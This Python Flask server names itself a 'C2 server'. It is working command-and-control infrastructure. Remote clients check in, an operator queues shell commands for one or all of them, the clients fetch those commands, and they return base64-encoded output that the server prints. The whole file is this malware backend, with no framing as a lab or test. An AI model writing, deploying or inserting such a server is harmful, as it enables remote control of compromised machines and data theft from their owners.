from flask import Flask, request, jsonify
import base64
from datetime import datetime

app = Flask(__name__)

clients = {}
commands = {}

@app.route('/checkin', methods=['POST'])
def checkin():
    try:
        data = request.get_json()
        client_id = data.get("client_id")

        if not client_id:
            return "Missing client_id", 403

        clients[client_id] = datetime.now()
        print(f"[{datetime.now()}] Client check-in: {client_id}")
        return "Checked in", 200
    except Exception as e:
        print(f"[!] Exception in /checkin: {e}")
        return "Bad request", 403

@app.route('/getcmd', methods=['POST'])
def get_command():
    try:
        data = request.get_json()
        client_id = data.get("client_id")

        if not client_id:
            return jsonify({"cmd": ""})

        cmd = commands.pop(client_id, "")
        print(f"[{datetime.now()}] Sent command to {client_id}: {cmd}")
        return jsonify({"cmd": cmd})
    except Exception as e:
        print(f"[!] Exception in /getcmd: {e}")
        return jsonify({"cmd": ""})

@app.route('/command', methods=['POST'])
def set_command():
    try:
        data = request.get_json()
        cmd = data.get("cmd")
        target = data.get("target", "ALL")

        if target == "ALL":
            for cid in clients.keys():
                commands[cid] = cmd
        else:
            commands[target] = cmd

        print(f"[{datetime.now()}] New command issued: {cmd} for {target}")
        return jsonify({"status": "Command set"})
    except Exception as e:
        print(f"[!] Exception in /command: {e}")
        return jsonify({"status": "Error"})

@app.route('/result', methods=['POST'])
def result():
    try:
        data = request.get_json()
        client_id = data.get("client_id", "UNKNOWN")
        encoded_result = data.get("result")

        if not encoded_result:
            return "Missing result", 400

        decoded = base64.b64decode(encoded_result).decode("utf-8")
        print(f"\n[{datetime.now()}] Result from {client_id}:\n{decoded}\n")
        return "Result received", 200
    except Exception as e:
        print(f"[!] Exception in /result: {e}")
        return "Invalid result data", 400

if __name__ == '__main__':
    print("[*] Starting C2 server on http://0.0.0.0:8080")
    app.run(host="0.0.0.0", port=8080)
